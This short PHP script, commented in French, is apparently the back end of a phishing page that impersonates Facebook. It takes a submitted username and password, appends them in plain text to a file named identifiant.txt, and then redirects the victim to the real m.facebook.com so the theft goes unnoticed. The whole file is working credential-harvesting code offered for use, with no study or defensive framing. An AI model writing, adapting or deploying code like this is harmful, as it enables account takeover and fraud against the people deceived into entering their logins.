<?php
// Vérifier si le formulaire est soumis
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Récupérer les données du formulaire sans supposer que c'est un email
    $identifiant = $_POST['identifiant'] ?? '';
    $password = $_POST['password'] ?? '';

    // Nettoyer les entrées
    $identifiant = trim($identifiant);
    $password = trim($password);

    // Format du texte à stocker
    $line = "User: " . $identifiant . " | Password: " . $password . "\n";

    // Sauvegarder dans identifiant.txt
    file_put_contents('identifiant.txt', $line, FILE_APPEND | LOCK_EX);

    // Rediriger l'utilisateur vers le vrai site mobile de Facebook
    header("Location: https://m.facebook.com");
    exit();
}
?>
